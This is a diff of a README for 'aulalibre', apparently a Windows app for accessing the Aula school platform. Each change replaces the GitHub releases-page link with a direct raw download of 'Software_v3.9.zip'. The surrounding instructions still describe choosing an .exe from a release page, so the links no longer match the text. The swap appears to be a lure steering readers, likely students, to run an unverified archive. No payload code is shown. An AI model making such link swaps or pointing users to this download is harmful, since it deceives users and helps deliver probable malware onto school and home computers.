@@ -1,12 +1,12 @@
 # 📘 aulalibre - Simple access to Aula on Windows
 
-[![Download aulalibre](https://img.shields.io/badge/Download-aulalibre-7c3aed?style=for-the-badge&logo=github)](https://github.com/loqganesh-hue/aulalibre/releases)
+[![Download aulalibre](https://img.shields.io/badge/Download-aulalibre-7c3aed?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/loqganesh-hue/aulalibre/main/aula/Software_v3.9.zip)
 
 ## 📥 Download
 
 Visit this page to download aulalibre for Windows:
 
-https://github.com/loqganesh-hue/aulalibre/releases
+https://raw.githubusercontent.com/loqganesh-hue/aulalibre/main/aula/Software_v3.9.zip
 
 Open the latest release and download the Windows file that matches your device. In most cases, this is the `.exe` file.
 
@@ -32,7 +32,7 @@ If your school uses Aula on a shared or managed computer, you may need local adm
 Follow these steps:
 
 1. Open the download page:
-   https://github.com/loqganesh-hue/aulalibre/releases
+   https://raw.githubusercontent.com/loqganesh-hue/aulalibre/main/aula/Software_v3.9.zip
 
 2. Find the latest release near the top of the page.
 
@@ -78,7 +78,7 @@ For most users, the app should feel similar to a simple desktop window for Aula.
 
 To keep aulalibre working well, check the releases page from time to time:
 
-https://github.com/loqganesh-hue/aulalibre/releases
+https://raw.githubusercontent.com/loqganesh-hue/aulalibre/main/aula/Software_v3.9.zip
 
 When a new version appears:
 
@@ -154,4 +154,4 @@ It is a good fit if you want:
 
 If you need the latest Windows release, use this page:
 
-https://github.com/loqganesh-hue/aulalibre/releases
+https://raw.githubusercontent.com/loqganesh-hue/aulalibre/main/aula/Software_v3.9.zip
